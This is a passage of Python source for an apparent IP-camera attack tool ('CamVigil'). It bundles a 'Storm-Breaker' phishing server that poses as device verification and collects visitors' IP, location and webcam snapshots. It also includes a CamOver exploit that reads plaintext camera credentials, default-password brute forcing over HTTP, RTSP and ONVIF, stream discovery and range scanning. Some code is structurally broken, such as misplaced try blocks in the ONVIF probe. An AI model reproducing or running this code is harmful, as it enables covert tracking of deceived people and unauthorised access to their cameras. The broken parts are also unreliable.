                fetch('/post', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(info)
                }).then(() => {
                    window.location.href = "{{ redirect_url }}";
                });
            }
            window.onload = start;
        </script>
    </head>
    <body style="background: black; color: white;">
        <h1>Verifying your device...</h1>
    </body>
    </html>
    """
}

current_config = {"template": "NearYou", "redirect_url": ""}

@app_flask.route('/')
def index():
    template = STORM_TEMPLATES.get(current_config["template"], STORM_TEMPLATES["NearYou"])
    return render_template_string(template, redirect_url=current_config["redirect_url"])

@app_flask.route('/post', methods=['POST'])
def post_data():
    data = request.json
    data['ip'] = request.remote_addr
    data['time'] = datetime.now().strftime("%H:%M:%S")
    storm_results.append(data)
    print(f"\\n[{FIRE}] STORM-BREAKER DATA RECEIVED!")
    print(f"    {INFO} IP: {data['ip']}")
    if 'lat' in data: print(f"    {GLOB} Location: {data['lat']}, {data['lon']}")
    if 'image' in data: print(f"    {CAM} Webcam Snapshot Captured!")
    return "OK"

def start_storm_server(template, redirect):
    global current_config
    current_config = {"template": template, "redirect_url": redirect}
    print(f"\\n[{RADR}] Starting Storm-Breaker Server on port 8080...")
    print(f"    {INFO} Template: {template}")
    print(f"    {INFO} Redirect: {redirect}")

    # Run Flask in a separate thread to not block Chaquopy
    def run():
        app_flask.run(host='0.0.0.0', port=8080)

    threading.Thread(target=run, daemon=True).start()

    local_ip = get_local_ip()
    print(f"\\n    {OPEN} Server Active at: http://{local_ip}:8080/")
    print(f"    {ALRT} Use NGROK to tunnel this port: 'ngrok http 8080'")

def get_storm_results():
    return json.dumps(storm_results)

def clear_storm_results():
    global storm_results
    storm_results = []
    return "Results Cleared"

def storm_breaker_gen(template_type, redirect_url):
    """
    Mock integration of Storm-Breaker features.
    In a real scenario, this would contact a backend to generate a tracking link.
    """
    start_storm_server(template_type, redirect_url)
    return "Server Started"

def probe_onvif(target_ip):
    """
    Attempts to discover ONVIF details for a specific IP.
    Uses WS-Discovery and direct service probing.
    """
    print(f"\n  [{RADR}] Probing ONVIF Services for {target_ip}:")

    try:
        if ONVIFCamera is None:
            print(f"    {ERR} ONVIF Library (onvif-zeep) not available. Cannot perform deep probe.")
            return

        # 1. WS-Discovery (Unicast Probe)
        ws_discovery_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
                    xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
                    xmlns:d="http://schemas.xmlsoap.org/ws/2004/08/discovery"
                    xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
            <e:Header>
                <w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>
                <w:To>urn:schemas-xmlsoap-org:ws:2004:08:discovery</w:To>
                <w:Action>http://schemas.xmlsoap.org/ws/2004/08/discovery/Probe</w:Action>
            </e:Header>
            <e:Body>
                <d:Probe>
                    <d:Types>dn:NetworkVideoTransmitter</d:Types>
                </d:Probe>
            </e:Body>
        </e:Envelope>"""

        onvif_ports = [3702, 80, 8080, 8888, 8000]
        discovered = False

        for port in onvif_ports:
            try:
                # Simple UDP probe for 3702
                if port == 3702:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.settimeout(1.5)
                        s.sendto(ws_discovery_xml.encode(), (target_ip, 3702))
                        data, addr = s.recvfrom(4096)
                        if data:
                            print(f"    {OPEN} ONVIF WS-Discovery Response from {addr}")
                            discovered = True
    except Exception as e:
        print(f"    {ERR} ONVIF Discovery Error: {str(e)}")
        return

            # Try to initialize ONVIF client if we have reason to believe it's there
            # We try common credentials
            for user, pwd in DEFAULT_CREDENTIALS:
                try:
                    # We need the wsdl path, but onvif-zeep can often find it or we use local ones
                    # For this tool, we'll try a simplified connection attempt
                    cam = ONVIFCamera(target_ip, port, user, pwd)

                    # 1. Device Information
                    dev_info = cam.devicemgmt.GetDeviceInformation()
                    print(f"    {FIRE} ONVIF AUTH SUCCESS: {user}:{pwd}")
                    print(f"    {INFO} Model: {dev_info.Model}")
                    print(f"    {INFO} Firmware: {dev_info.FirmwareVersion}")
                    print(f"    {INFO} Serial: {dev_info.SerialNumber}")

                    # 2. Capabilities
                    caps = cam.devicemgmt.GetCapabilities()
                    print(f"    {PLD} Capabilities:")
                    if hasattr(caps, 'Media') and caps.Media: print(f"       - Media Service: {caps.Media.XAddr}")
                    if hasattr(caps, 'PTZ') and caps.PTZ: print(f"       - PTZ Service: {caps.PTZ.XAddr}")
                    if hasattr(caps, 'Imaging') and caps.Imaging: print(f"       - Imaging Service: {caps.Imaging.XAddr}")

                    # 3. Media Profiles & Streams
                    media_service = cam.create_media_service()
                    profiles = media_service.GetProfiles()
                    print(f"    {STRM} Found {len(profiles)} Media Profiles:")
                    for prof in profiles:
                        print(f"       - {prof.Name} (Token: {prof.token})")
                        try:
                            stream_setup = {'Stream': 'RTP-Unicast', 'Transport': {'Protocol': 'RTSP'}}
                            stream_uri = media_service.GetStreamUri(stream_setup, prof.token)
                            print(f"         🔗 RTSP URI: {stream_uri.Uri}")
                        except: pass

                    # 4. System Date & Time
                    sys_time = cam.devicemgmt.GetSystemDateAndTime()
                    dt = sys_time.UTCDateTime
                    if dt:
                        print(f"    {GLOB} System Time: {dt.Date.Year}-{dt.Date.Month}-{dt.Date.Day} {dt.Time.Hour}:{dt.Time.Minute} UTC")

                    # 5. Check Anonymous Access
                    if user == "" and pwd == "":
                        print(f"    {ALRT} CRITICAL: Anonymous ONVIF Access Allowed!")

                    # 6. PTZ Check
                    try:
                        ptz_service = cam.create_ptz_service()
                        print(f"    {CAM} PTZ Control: Available")
                    except: pass

                    discovered = True
                    break # Stop trying credentials if one works
                except Exception as e:
                    if "401" in str(e) or "Unauthorized" in str(e):
                        continue # Try next cred
                    else:
                        break # Likely not an ONVIF service on this port

            if discovered: break
        except:
            pass

    if not discovered:
        print(f"    {INFO} No active ONVIF services detected via standard probes.")

def cam_over_exploit(ip, port, proto):
    """
    Implements the CamOver / GoAhead / Netwave information disclosure exploit.
    Targets /system.ini?loginuse&loginpas to retrieve plaintext credentials.
    """
    url = f"{proto}://{ip}:{port}/system.ini?loginuse&loginpas"
    try:
        r = requests.get(url, timeout=3, verify=False)
        if r.status_code == 200 and r.content:
            # Netwave/GoAhead often return binary or weirdly formatted data
            # but sometimes it's just plaintext in the .ini
            content = r.text
            user_match = re.search(r"loginuse=(.*)", content)
            pass_match = re.search(r"loginpas=(.*)", content)

            if user_match or pass_match:
                user = user_match.group(1).strip() if user_match else "unknown"
                pwd = pass_match.group(1).strip() if pass_match else "unknown"
                print(f"    {FIRE} CAMOVER EXPLOIT SUCCESS: {url}")
                print(f"    {KEY} CRACKED (CamOver): {user}:{pwd}")
                return user, pwd
    except:
        pass
    return None

def banner_grab(ip, port):
    """Attempts to grab service banner from open ports."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.5)
            s.connect((ip, port))
            # Some services require a small delay or a newline
            if port == 80:
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            banner = s.recv(1024).decode(errors="ignore").strip()
            if banner:
                print(f"    {INFO} Banner ({port}): {banner[:100]}")
                return banner
    except: pass
    return None

def scan_single_target(target_ip, specific_port=None):
    print(f"\n{SCAN} Scanning target IP: {target_ip}")
    success_cred = None # Initialize to avoid UnboundLocalError
    mac, vendor = get_mac_vendor(target_ip)
    if mac != "Unknown":
        print(f"  {INFO} Hardware ID (MAC): {mac}")
        print(f"  {INFO} Manufacturer: {vendor}")

    ports_to_scan = [specific_port] if specific_port else COMMON_PORTS
    print(f"  {ALRT} Port Scan Depth: {len(ports_to_scan)} tactical ports...")

    open_ports = []
    rtsp_info = {}
    lock = threading.Lock()
    count = 0

    def scan_port(p):
        nonlocal count
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.7) # Optimized timeout
                if s.connect_ex((target_ip, p)) == 0:
                    with lock: open_ports.append(p)
                    service = PORT_SERVICE_MAP.get(p, "Unknown Service")

                    # Banner Grabbing for more info
                    banner = banner_grab(target_ip, p)

                    is_rtsp, server = probe_rtsp(target_ip, p)
                    if is_rtsp:
                        with lock: rtsp_info[p] = server
                        print(f"  {OPEN} [OPEN] {p}/tcp  RTSP ({server or 'Streaming'})")
                    else:
                        print(f"  {OPEN} [OPEN] {p}/tcp  {service}")
        except: pass
        with lock:
            count += 1
            if not specific_port and (count % 100 == 0 or count == len(ports_to_scan)):
                print(f"  {PLD} Progress: {count}/{len(ports_to_scan)} ports...")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(scan_port, ports_to_scan)

    if open_ports:
        print(f"\n  {PLD} Summary: {len(open_ports)} ports open on {target_ip}")
        brand = "Generic"
        web_ports = [p for p in open_ports if p in [80, 81, 82, 88, 443, 8000, 8080, 8443, 9000, 5000]]

        for p in sorted(web_ports):
            content, server = analyze_http_port(target_ip, p)
            proto = "https" if p in [443, 8443] else "http"

            if proto == "https":
                analyze_tls(target_ip, p)

            if "hikvision" in content or "hikvision" in server: brand = "Hikvision"
            elif "dahua" in content or "dahua" in server: brand = "Dahua"
            elif "axis" in content or "axis" in server: brand = "Axis"

        print(f"\n  [{RADR}] Fingerprinting {target_ip}:")
        for p in sorted(web_ports):
            proto = "https" if p in [443, 8443] else "http"
            found_any = False
            for path in FINGERPRINT_PATHS:
                try:
                    url = f"{proto}://{target_ip}:{p}{path}"
                    r = requests.get(url, timeout=3, verify=False)
                    if r.status_code == 200:
                        print(f"    {OPEN} Found Sensitive Data/Config: {url}")
                        found_any = True

                        # Extract more info if it looks like XML/JSON/Plaintext
                        info = parse_firmware_data(r.text, brand)
                        if info["model"] != "Unknown" or info["firmware"] != "Unknown":
                            print(f"       {PLD} Extracted Intel:")
                            print(f"         - Model: {info['model']}")
                            print(f"         - Firmware: {info['firmware']}")
                            print(f"         - Build: {info['build']}")

                        if "axis" in path: brand = "Axis"
                        elif "hikvision" in path: brand = "Hikvision"

                        # Check for exposed config or debug
                        if any(x in path.lower() for x in ["config", "log", "shell", "kmsg"]):
                            print(f"       {FIRE} CRITICAL: Exposed system component detected!")
                except: pass

            # Run directory enumeration
            auth_info = (success_cred[0], success_cred[1]) if success_cred else None
            directory_enumeration(target_ip, p, proto, brand, auth=auth_info)

            if not found_any:
                print(f"    {INFO} Port {p}: No firmware data exposed.")

            # Cloud and Resilience Tests
            if p in [80, 443, 8080, 8000]:
                test_dos_resilience(target_ip, p)

            # CamOver Exploit Check
            camover_creds = cam_over_exploit(target_ip, p, proto)
            if camover_creds:
                success_cred = (camover_creds[0], camover_creds[1], f"{proto}://{target_ip}:{p}/")

        # New ONVIF Discovery Step
        probe_onvif(target_ip)

        if brand in CVE_DATABASE:
            print(f"\n  [{SHLD}] Known Vulnerabilities for {brand}:")
            for cve_id, desc in CVE_DATABASE[brand]:
                print(f"    🔗 {cve_id}: {desc}")

        print(f"\n  [{KEY}] Physical Security Assessment ({brand}):")
        print(f"    🛠️ {get_physical_security_hints(brand)}")

        # Check for exposed management services
        mgmt_services = {21: "FTP", 22: "SSH", 23: "Telnet"}
        for port, svc in mgmt_services.items():
            if port in open_ports:
                print(f"  {ALRT} Management Service {svc} is EXPOSED on port {port}!")

        print(f"\n  [{KEY}] Testing Credentials on {target_ip}:")
        success_cred = None

        # 1. Prioritize Brand Credentials
        test_creds = []
        if brand in BRAND_CREDENTIALS:
            test_creds.extend(BRAND_CREDENTIALS[brand])

        # 2. Add remaining defaults
        for c in DEFAULT_CREDENTIALS:
            if c not in test_creds:
                test_creds.append(c)

        # 3. Optional: Add IoT Common Dictionary if nothing found yet (top 20 for speed)
        for p in IOT_COMMON_PASSWORDS[:20]:
            pair = ("admin", p)
            if pair not in test_creds:
                test_creds.append(pair)

        for user, pwd in test_creds:
            if success_cred: break

            # Test HTTP
            if web_ports:
                p = web_ports[0]
                try:
                    url = f"http{'s' if p in [443, 8443] else ''}://{target_ip}:{p}/"
                    # Try with and without auth if user/pwd are empty
                    if user == "" and pwd == "":
                        r = requests.get(url, timeout=2, verify=False)
                    else:
                        r = requests.get(url, auth=(user, pwd), timeout=2, verify=False)

                    if r.status_code == 200 and "login" not in r.url.lower():
                        success_cred = (user, pwd, url)
                        if user == "" and pwd == "":
                            print(f"    {FIRE} CRITICAL: UNPASSWORDED HTTP ACCESS DETECTED!")
                        else:
                            print(f"    {FIRE} CRACKED (HTTP): {user}:{pwd} @ {url}")
                        break
                except: pass

            # Test RTSP Basic Auth
            rtsp_ports = [p for p in open_ports if p in [554, 8554, 10554]]
            for rp in rtsp_ports:
                if success_cred: break
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1.5)
                        if s.connect_ex((target_ip, rp)) == 0:
                            if user == "" and pwd == "":
                                # Try unauthenticated DESCRIBE
                                msg = f"DESCRIBE rtsp://{target_ip}:{rp}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
                            else:
                                auth_str = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                                msg = f"DESCRIBE rtsp://{target_ip}:{rp}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth_str}\r\n\r\n"

                            s.sendall(msg.encode())
                            response = s.recv(1024).decode(errors="ignore")
                            if "RTSP/1.0 200" in response:
                                success_cred = (user, pwd, f"rtsp://{target_ip}:{rp}/")
                                if user == "" and pwd == "":
                                    print(f"    {FIRE} CRITICAL: UNPASSWORDED RTSP STREAM DETECTED!")
                                else:
                                    print(f"    {FIRE} CRACKED (RTSP): {user}:{pwd} @ rtsp://{target_ip}:{rp}")
                                    print(f"       {ALRT} SECURITY NOTE: RTSP Basic Auth is UNENCRYPTED. Credentials can be sniffed via Wireshark/Tcpdump.")
                                break
                except: pass

        print(f"\n  [{STRM}] Live Stream & Snapshot Discovery:")

        detected_links = []

        for p in sorted(web_ports):
            proto = "https" if p in [443, 8443] else "http"
            base = f"{proto}://{target_ip}:{p}"

            # Real camera common paths (prioritized)
            camera_paths = [
                "/mjpeg", "/video", "/live", "/stream", "/videostream.cgi",
                "/cgi-bin/mjpg/video.cgi", "/cgi-bin/snapshot.cgi", "/snapshot.jpg",
                "/ISAPI/Streaming/channels/101/picture", "/ISAPI/Streaming/channels/102/picture",
                "/cgi-bin/viewer/video.jpg", "/control/faststream.jpg", "/api/video",
                "/onvif/Media", "/media/video1"
            ]

            for path in camera_paths:
                url = base + path
                try:
                    r = requests.head(url, timeout=4, verify=False, allow_redirects=True)
                    if r.status_code in [200, 401, 403]:
                        link_type = "SNAPSHOT" if "snapshot" in path or "picture" in path else "MJPEG_STREAM"
                        detected_links.append({
                            "url": url,
                            "type": link_type,
                            "status": r.status_code
                        })
                        print(f"    🎯 Found {link_type}: {url} (HTTP {r.status_code})")
                except:
                    continue

        # RTSP for all detected RTSP ports
        for p, server in rtsp_info.items():
            # Add common paths for the detected RTSP port
            base_rtsp = f"rtsp://{target_ip}:{p}"
            paths = ["/stream1", "/live/ch0", "/onvif1", "/Streaming/Channels/1", "/"]
            for path in paths:
                url = base_rtsp + path
                if not any(l["url"] == url for l in detected_links):
                    detected_links.append({"url": url, "type": "RTSP (Detected)", "status": "N/A"})
                    print(f"    🎥 RTSP Stream: {url}")

        # Suggest RTSP URLs based on brand if not already detected
        brand_rtsp_paths = {
            "Hikvision": ["/ISAPI/Streaming/channels/101", "/Streaming/Channels/1", "/live/ch0"],
            "Dahua": ["/cam/realmonitor?channel=1&subtype=0", "/live"],
            "Axis": ["/axis-media/media.amp", "/axis-media/media.3gp"],
            "Foscam": ["/videoMain"],
            "Reolink": ["/h264Preview_01_main"],
            "Samsung/Hanwha": ["/st_main", "/video.cgi"],
            "CP Plus": ["/cam/realmonitor?channel=1&subtype=0"]
        }

        if brand in brand_rtsp_paths:
            print(f"    {INFO} Brand-Specific RTSP Paths identified for {brand}:")
            for path in brand_rtsp_paths[brand]:
                suggested_url = f"rtsp://{target_ip}:554{path}"
                if not any(l["url"] == suggested_url for l in detected_links):
                    detected_links.append({"url": suggested_url, "type": "RTSP (Suggested)", "status": "N/A"})
                    print(f"      🔗 {suggested_url}")

        # Machine readable output
        if detected_links:
            print(f"  ✅ Found {len(detected_links)} camera links!")
            print(f"    {INFO} Tip: RTSP streams are best viewed in VLC or the app's Live View.")
            print("===LINKS_START===")
            for link in detected_links[:10]:
                print(f"{link['type']}|{link['url']}|{link['status']}")
            print("===LINKS_END===")
    else:
        print(f"  {ERR} No open ports found on {target_ip}.")

def main(target_input=None):
    if not target_input: return

    print(f"{SCAN} Initiating CamVigil Reconnaissance...")

    # 1. Broad Discovery (UPnP/SSDP)
    upnp_results = discover_upnp_ssdp()

    targets = []
    try:
        # Support for IP:PORT format
        if ":" in target_input and "/" not in target_input and "-" not in target_input:
            parts = target_input.split(":")
            ip = parts[0].strip()
            port = int(parts[1].strip())
            print(f"{INFO} Target: {ip} | Targeted Port: {port}")
            scan_single_target(ip, specific_port=port)
            return

        if "/" in target_input:
            # CIDR notation (e.g., 192.168.1.0/24)
            print(f"{RADR} Expanding CIDR Range: {target_input}")
            network = ipaddress.ip_network(target_input, strict=False)
            targets = [str(ip) for ip in network.hosts()]
        elif "-" in target_input:
            # Range notation (e.g., 192.168.1.1-192.168.1.50 or 192.168.1.1-50)
            print(f"{RADR} Expanding IP Range: {target_input}")
            parts = target_input.split("-")
            start_ip = ipaddress.ip_address(parts[0].strip())

            if "." in parts[1]:
                end_ip = ipaddress.ip_address(parts[1].strip())
            else:
                # Handle 192.168.1.1-50 format
                start_str = str(start_ip)
                prefix = start_str[:start_str.rfind(".") + 1]
                end_ip = ipaddress.ip_address(prefix + parts[1].strip())

            curr = start_ip
            while curr <= end_ip:
                targets.append(str(curr))
                curr += 1
        else:
            targets = [target_input]

        if len(targets) > 1:
            print(f"  {INFO} Total Targets Identified: {len(targets)}")
            print(f"  {ALRT} Large range detected. Fast discovery enabled.")
    except Exception as e:
        print(f"{ERR} Error parsing target range: {str(e)}")
        return

    for ip in targets:
        # For ranges, we do a quick check first to see if the host is alive
        if len(targets) > 1:
            is_alive = False
            # Quick check on common web/rtsp ports
            for p in [80, 443, 554, 8080, 8000, 37777]:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.3)
                        if s.connect_ex((ip, p)) == 0:
                            is_alive = True
                            break
                except: pass

            if is_alive:
                scan_single_target(ip)
            else:
                # Just a small status line for skipped hosts to show progress
                pass
        else:
            scan_single_target(ip)

    print(f"\n{DONE} ALL SCANS COMPLETE.")

if __name__ == "__main__":
    main()

def discover_mdns():
    """
    Simple mDNS (Multicast DNS) discovery for local devices.
    Sends a query for _services._dns-sd._udp.local.
    """
    print(f"\n{RADR} Sending mDNS (Zeroconf) Discovery Probe...")
    mdns_query = (
        b'\x00\x00'  # Transaction ID
        b'\x00\x00'  # Flags
        b'\x00\x01'  # Questions
        b'\x00\x00'  # Answer RRs
        b'\x00\x00'  # Authority RRs
        b'\x00\x00'  # Additional RRs
        b'\t_services\x07_dns-sd\x04_udp\x05local\x00'
        b'\x00\x0c'  # Type: PTR
        b'\x00\x01'  # Class: IN
    )

    discovered = {}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(3)
        sock.sendto(mdns_query, ('224.0.0.251', 5353))

        while True:
            try:
                data, addr = sock.recvfrom(4096)
                if addr[0] not in discovered:
                    discovered[addr[0]] = "mDNS Device"
                    print(f"  {OPEN} mDNS RESPONSE from {addr[0]}")
            except socket.timeout:
                break
    except Exception as e:
        print(f"  {ERR} mDNS Discovery Error: {str(e)}")
    return discovered

def lan_scan():
    """Advanced LAN Scanner for Chaquopy"""
    output = []
    output.append(f"{SCAN} LAN Scanner Started")
    output.append("=" * 50)

    # 1. UPnP/SSDP Discovery
    output.append(f"\n{RADR} Running SSDP Multicast Discovery...")
    upnp_devices = discover_upnp_ssdp()

    # 2. mDNS Discovery
    output.append(f"\n{RADR} Running mDNS Discovery...")
    mdns_devices = discover_mdns()

    # 3. Network Interface Info
    local_ip = get_local_ip()
    output.append(f"\n{INFO} Local Interface: {local_ip}")

    if local_ip == "127.0.0.1":
        output.append(f"{ALRT} Could not identify local network range.")
        return "\n".join(output)

    prefix = ".".join(local_ip.split(".")[:-1]) + "."
    output.append(f"{RADR} Scanning Subnet: {prefix}0/24")

    # 4. Fast ARP/Ping Scan (Expanded range)
    active_hosts = []
    # Add UPnP and mDNS found IPs first
    for ip in list(upnp_devices.keys()) + list(mdns_devices.keys()):
        if ip not in active_hosts: active_hosts.append(ip)

    def check_alive(ip):
        # Expanded check for LAN discovery
        for port in [80, 443, 554, 8000, 8080, 37777, 34567, 81, 82, 88, 9000, 3702, 5000]:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.2)
                    if s.connect_ex((ip, port)) == 0:
                        return True
            except: pass
        return False

    output.append(f"{INFO} Probing subnet for active hosts...")
    # Scan in chunks of 50 for better speed/stability on Android
    with ThreadPoolExecutor(max_workers=30) as executor:
        # Scan 1-254 but prioritize common ones if we want it fast
        # Here we'll do a full scan of the /24 as it's what users usually expect from a "LAN Scanner"
        futures = {executor.submit(check_alive, prefix + str(i)): prefix + str(i) for i in range(1, 255)}
        for future in futures:
            if future.result():
                ip = futures[future]
                if ip not in active_hosts: active_hosts.append(ip)

    if not active_hosts:
        output.append(f"\n{ALRT} No active hosts found via fast probe.")
        output.append(f"💡 Try scanning your Gateway IP: {prefix}1")
    else:
        # Sort IPs for better UX
        active_hosts.sort(key=lambda x: int(x.split('.')[-1]))
        output.append(f"\n{OPEN} Discovered {len(active_hosts)} Active Hosts:")
        for ip in active_hosts:
            mac, vendor = get_mac_vendor(ip)
            if vendor == "MAC Restricted":
                # Fallback identification for Android 10+
                vendor = identify_device(ip)

            output.append(f"  ▶ {ip} | {vendor}")
            if mac != "Unknown" and mac != "MAC Restricted":
                output.append(f"     └─ MAC: {mac}")
            if ip in upnp_devices:
                output.append(f"     └─ UPnP: {upnp_devices[ip]}")
            if ip in mdns_devices:
                output.append(f"     └─ mDNS: Detected")

    output.append(f"\n{DONE} LAN Scan Complete.")
    return "\n".join(output)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"
